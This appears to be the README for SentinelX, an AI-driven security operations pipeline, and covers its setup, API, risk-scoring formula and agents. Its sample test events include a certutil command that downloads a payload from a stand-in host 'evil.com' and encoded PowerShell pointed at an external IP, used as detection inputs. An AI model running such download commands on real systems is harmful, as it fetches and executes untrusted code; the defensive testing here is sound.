# SentinelX Backend

> **Agentic Security Operations Center** powered by LangGraph + Google Gemini 2.0 Flash

SentinelX is an AI-driven SOC pipeline that ingests security logs, scores them through multi-layered risk analysis, and routes them to specialist AI agents for automated threat investigation and incident reporting.

---

## Table of Contents

- [Architecture](#architecture)
- [Pipeline Flow](#pipeline-flow)
- [Project Structure](#project-structure)
- [Prerequisites](#prerequisites)
- [Setup — macOS](#setup--macos)
- [Setup — Windows](#setup--windows)
- [Configuration](#configuration)
- [Running the Server](#running-the-server)
- [API Endpoints](#api-endpoints)
- [Testing with Sample Events](#testing-with-sample-events)
- [Running Tests](#running-tests)
- [Modules Reference](#modules-reference)
- [Troubleshooting](#troubleshooting)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     FastAPI Server                           │
│  POST /ingest  →  LangGraph Pipeline  →  JSON Report        │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│                    LangGraph Pipeline                        │
│                                                             │
│  Normalizer → Heuristic Risk → Graph Layer → Risk Combiner  │
│       → Orchestrator → Agents → Triage → Report → END       │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│                   Specialist Agents                          │
│  Malware │ Network │ ThreatIntel │ VirusTotal │ Triage      │
│        (Gemini AI + Local Knowledge Base + VT API)          │
└─────────────────────────────────────────────────────────────┘
```

---

## Pipeline Flow

Each security log is processed through this sequential pipeline:

```
1. Event Normalizer     — Standardizes raw logs, generates UUIDs, extracts process metadata
2. Heuristic Risk       — Deterministic risk scoring (LOLBin detection, encoded PowerShell, bad hashes)
3. Graph Intelligence   — Temporal behavioral graph anomaly scoring using NetworkX
4. Risk Combiner        — Weighted combination (60% heuristic + 40% graph) with non-linear scaling (k=2)
5. Orchestrator         — Gemini AI decides which specialist agents to invoke
6. Malware Agent        — Gemini-powered command-line malware analysis
7. Network Agent        — IP and network threat analysis
8. ThreatIntel Agent    — Local MalwareBazaar knowledge base hash lookup
9. VirusTotal Agent     — Real-time VT API file hash reputation check
10. Triage Agent        — Gemini AI severity and confidence assessment
11. Report Agent        — Structured SOC incident report generation
```

---

## Project Structure

```
sentinelx/
├── .env                        # API keys (create this — not in git)
├── requirements.txt            # Python dependencies
├── main.py                     # FastAPI entry point
├── config.py                   # Configuration & environment loading
├── __init__.py
│
├── models/
│   ├── log_model.py            # SecurityLog Pydantic input schema
│   ├── state.py                # SentinelState TypedDict (pipeline state)
│   ├── event_model.py          # Normalized event model
│   ├── incident_model.py       # Incident output model
│   └── case_model.py           # Case storage model
│
├── normalization/
│   └── event_normalizer.py     # Log normalization node
│
├── risk/
│   ├── heuristic_risk.py       # Rule-based risk scoring
│   └── risk_combiner.py        # Weighted risk combination + non-linear scaling
│
├── graph/
│   ├── graph_engine.py         # Temporal behavioral graph (NetworkX DiGraph)
│   ├── graph_metrics.py        # Graph anomaly score computation
│   └── graph_layer_node.py     # LangGraph node wrapper
│
├── agents/
│   ├── orchestrator.py         # Gemini-powered event classifier & router
│   ├── malware_agent.py        # Malware analysis agent
│   ├── network_agent.py        # Network threat analysis agent
│   ├── threatintel_agent.py    # Local intelligence KB lookup
│   ├── vt_agent.py             # VirusTotal API agent
│   ├── triage_agent.py         # Severity & confidence assessment
│   └── report_agent.py         # SOC incident report generator
│
├── core/
│   ├── router.py               # LangGraph workflow compilation
│   └── case_store.py           # In-memory incident store
│
├── threat_intel/
│   ├── loader.py               # MalwareBazaar CSV dataset loader
│   └── index.py                # Hash lookup & query interface
│
├── data/
│   └── malware_bazaar/
│       └── malware_90ds_filtered.csv  # Threat intelligence dataset
│
└── utils/
    └── __init__.py
```

---

## Prerequisites

| Requirement      | Version  | Notes                                |
|------------------|----------|--------------------------------------|
| Python           | ≥ 3.10   | 3.12 recommended                     |
| pip              | ≥ 22.0   | Comes with Python                    |
| Gemini API Key   | —        | **Required** — get from [Google AI Studio](https://aistudio.google.com/apikey) |
| VirusTotal Key   | —        | Optional — enables live hash lookups |

---

## Setup — macOS

```bash
# 1. Clone the repository
git clone https://github.com/HarshaKamakshigari/SentinelX.git
cd SentinelX

# 2. Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# 3. Install dependencies
pip install -r sentinelx/requirements.txt

# 4. Create the environment file
cp sentinelx/.env.example sentinelx/.env   # if .env.example exists
# OR create manually:
cat > sentinelx/.env << EOF
GEMINI_API_KEY=your-gemini-api-key-here
VIRUSTOTAL_API_KEY=your-virustotal-api-key-here
EOF

# 5. Run the server
uvicorn sentinelx.main:app --reload --host 0.0.0.0 --port 8000
```

---

## Setup — Windows

```powershell
# 1. Clone the repository
git clone https://github.com/HarshaKamakshigari/SentinelX.git
cd SentinelX

# 2. Create and activate virtual environment
python -m venv venv
venv\Scripts\activate

# 3. Install dependencies
pip install -r sentinelx\requirements.txt

# 4. Create the environment file
# Create sentinelx\.env with the following content:
#   GEMINI_API_KEY=your-gemini-api-key-here
#   VIRUSTOTAL_API_KEY=your-virustotal-api-key-here

# Using PowerShell:
@"
GEMINI_API_KEY=your-gemini-api-key-here
VIRUSTOTAL_API_KEY=your-virustotal-api-key-here
"@ | Out-File -FilePath sentinelx\.env -Encoding utf8

# 5. Run the server
uvicorn sentinelx.main:app --reload --host 0.0.0.0 --port 8000
```

---

## Configuration

All configuration lives in `sentinelx/config.py` and `sentinelx/.env`.

### Environment Variables (`.env`)

| Variable             | Required | Description                          |
|----------------------|----------|--------------------------------------|
| `GEMINI_API_KEY`     | **Yes**  | Google Gemini API key                |
| `VIRUSTOTAL_API_KEY` | No       | VirusTotal API key (mock if missing) |

### Risk Engine Settings (`config.py`)

| Setting                    | Default | Description                                         |
|----------------------------|---------|-----------------------------------------------------|
| `RISK_FLAGS`               | dict    | Heuristic risk weights per indicator type            |
| `RISK_COMBINATION_WEIGHTS` | `{"heuristic": 0.6, "graph": 0.4}` | Weighted combination ratio   |
| `RISK_SCALING_POWER`       | `2`     | Non-linear exponent for risk amplification           |

---

## Running the Server

### Start (Development)

```bash
# macOS / Linux
source venv/bin/activate
uvicorn sentinelx.main:app --reload --host 0.0.0.0 --port 8000

# Windows
venv\Scripts\activate
uvicorn sentinelx.main:app --reload --host 0.0.0.0 --port 8000
```

The server starts at **http://localhost:8000**.

- Swagger docs: http://localhost:8000/docs
- ReDoc: http://localhost:8000/redoc
- Health check: http://localhost:8000/health

### Start (Production)

```bash
uvicorn sentinelx.main:app --host 0.0.0.0 --port 8000 --workers 4
```

---

## API Endpoints

| Method   | Path                 | Description                                          |
|----------|----------------------|------------------------------------------------------|
| `GET`    | `/`                  | Service info — version, status, threat intel stats   |
| `GET`    | `/health`            | Health check                                         |
| `POST`   | `/ingest`            | Ingest a security log through the full pipeline      |
| `GET`    | `/incidents`         | List all processed incidents                         |
| `DELETE` | `/incidents`         | Clear all stored incidents                           |
| `GET`    | `/threat-intel/stats`| Threat intelligence KB statistics                    |

### `POST /ingest` — Request Body

```json
{
  "host": "finance-01",
  "event_type": "process_creation",
  "process_name": "powershell.exe",
  "parent_process": "explorer.exe",
  "command_line": "powershell.exe -enc ABC123",
  "source_ip": "10.0.1.50",
  "destination_ip": "45.77.12.90",
  "file_hash": null,
  "file_name": null,
  "user_id": "jdoe",
  "raw_log": null
}
```

All fields are **optional** (`null` if not present).

---

## Testing with Sample Events

### Using curl (macOS/Linux)

**High-risk event — encoded PowerShell + external IP:**
```bash
curl -X POST http://localhost:8000/ingest \
  -H "Content-Type: application/json" \
  -d '{
    "host": "finance-01",
    "event_type": "process_creation",
    "command_line": "powershell.exe -enc SGVsbG8gV29ybGQ=",
    "destination_ip": "45.77.12.90",
    "user_id": "admin"
  }'
```

**Medium-risk event — LOLBin abuse:**
```bash
curl -X POST http://localhost:8000/ingest \
  -H "Content-Type: application/json" \
  -d '{
    "host": "dev-workstation",
    "event_type": "process_creation",
    "command_line": "certutil -urlcache -f http://evil.com/payload.exe",
    "user_id": "developer"
  }'
```

**Low-risk event — normal activity:**
```bash
curl -X POST http://localhost:8000/ingest \
  -H "Content-Type: application/json" \
  -d '{
    "host": "web-server-01",
    "event_type": "login",
    "source_ip": "192.168.1.100",
    "user_id": "sysadmin"
  }'
```

**Hash lookup event — file hash analysis:**
```bash
curl -X POST http://localhost:8000/ingest \
  -H "Content-Type: application/json" \
  -d '{
    "host": "endpoint-42",
    "event_type": "file_creation",
    "file_hash": "abcd1234",
    "file_name": "suspicious.exe",
    "user_id": "user01"
  }'
```

### Using curl (Windows PowerShell)

```powershell
Invoke-RestMethod -Method POST -Uri http://localhost:8000/ingest `
  -ContentType "application/json" `
  -Body '{"host":"finance-01","event_type":"process_creation","command_line":"powershell.exe -enc SGVsbG8=","destination_ip":"45.77.12.90"}'
```

### List all incidents

```bash
curl http://localhost:8000/incidents
```

### Clear incidents

```bash
curl -X DELETE http://localhost:8000/incidents
```

---

## Running Tests

```bash
# macOS / Linux
source venv/bin/activate
python -m pytest tests/ -v

# Windows
venv\Scripts\activate
python -m pytest tests/ -v
```

Available test files:
- `tests/test_event_normalizer.py` — Event normalization tests
- `tests/test_graph_intelligence.py` — Graph intelligence layer tests

---

## Modules Reference

### Risk Scoring Pipeline

| Module | Input | Output | Description |
|--------|-------|--------|-------------|
| `heuristic_risk.py` | Normalized event | `heuristic_risk` (0–1) | Deterministic checks: encoded PowerShell, LOLBins, external IPs, known bad hashes |
| `graph_layer_node.py` | Normalized event | `graph_anomaly_score` (0–1) | Temporal behavioral graph — node degree history + edge frequency anomaly detection |
| `risk_combiner.py` | Both scores | `estimated_risk`, `scaled_risk` | Weighted combination: `0.6×heuristic + 0.4×graph`, then `score^2` non-linear scaling |

### Risk Combination Formula

```
estimated_risk = min(1.0, 0.6 × heuristic_risk + 0.4 × graph_anomaly_score)
scaled_risk    = estimated_risk ^ 2
```

| Estimated Risk | Scaled Risk | Effect                |
|----------------|-------------|-----------------------|
| 0.10           | 0.01        | Suppressed (noise)    |
| 0.30           | 0.09        | Low priority          |
| 0.50           | 0.25        | Moderate              |
| 0.70           | 0.49        | Elevated              |
| 0.90           | 0.81        | Critical — fully routed |

### Agent Decision Logic

The orchestrator uses `scaled_risk` to gate agent invocation:
- **`scaled_risk < 0.1`** + no strong artifacts → skip all agents (noise suppression)
- Otherwise → Gemini AI selects which agents to invoke based on event context

---

## Troubleshooting

### `RuntimeError: GEMINI_API_KEY is not set`

Create `sentinelx/.env` with your API key:
```
GEMINI_API_KEY=your-key-here
```

### `ModuleNotFoundError: No module named 'langgraph'`

Ensure you're in the virtual environment:
```bash
source venv/bin/activate   # macOS/Linux
venv\Scripts\activate      # Windows
pip install -r sentinelx/requirements.txt
```

### `FileNotFoundError: malware_90ds_filtered.csv`

Ensure the threat intel dataset exists at:
```
sentinelx/data/malware_bazaar/malware_90ds_filtered.csv
```

### Port already in use

```bash
# Kill the process on port 8000
lsof -ti:8000 | xargs kill -9     # macOS/Linux
netstat -ano | findstr :8000       # Windows — then taskkill /PID <pid> /F
```

### Windows: `venv\Scripts\activate` not recognized

Run PowerShell as Administrator and execute:
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

---

## License

See the repository root for license information.
